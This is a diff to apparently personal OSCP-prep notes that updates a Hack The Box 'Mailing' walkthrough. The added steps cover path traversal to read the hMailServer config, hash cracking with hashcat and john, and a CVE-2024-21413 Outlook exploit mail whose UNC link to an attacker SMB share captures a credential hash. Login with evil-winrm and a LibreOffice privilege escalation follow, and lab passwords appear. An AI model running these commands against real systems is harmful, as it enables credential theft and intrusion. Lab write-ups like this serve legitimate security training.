@@ -35,19 +35,21 @@ OSCP Like
 
 ```
 
-## HTB: Mailing 07 Sep 2024
+## HTB: Mailing 07 Sep 2024 (a buggy box)
 ```
 1. Windows relative path traverse: "..\..\Windows\System32\drivers\etc\hosts" (not like linux: ../../etc/hosts)
 2. google service config path: ..\..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini. download it
 3. cmd: hashcat -m 0 ./md5-hash.txt /usr/share/wordlists/rockyou.txt (md5-hash.txt contains one line of the hashed pass found in .ini file)
 4. a Google search for recent vulnerabilities related to Windows Mail -> CVE-2024-21413
-5. git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
-6. start smb server on attacker machine: $ impacket-smbserver smbFolder $(pwd) -smb2support
-7. TCP port 587 is the default port for sending outgoing emails using the Simple Mail Transfer Protocol (SMTP)
-8. 
-
-
-
+5. git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability 
+6. TCP port 587 is the default port for sending outgoing emails using the Simple Mail Transfer Protocol (SMTP)
+7. As found "Maya Bendito" on webpage, guess a user with email address maya@mailing.htb
+8. start smb server on attacker machine: $ impacket-smbserver smbFolder $(pwd) -smb2support
+9. Send CVE mail to user maya@mailing.htb, cmd: $ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\YOUR_IP\smbFolder\test.txt" --subject Test
+10. save captured pass in a file hast.txt
+11. cmd: john -w=/usr/share/wordlists/rockyou.txt hash.txt
+12. login as user maya, cmd:  evil-winrm -u maya -p m4y4ngs4ri -i mailing.htb
+13. exploit https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/ to get root.
 ```
 
 ## HTB: Usage 10 Aug 2024
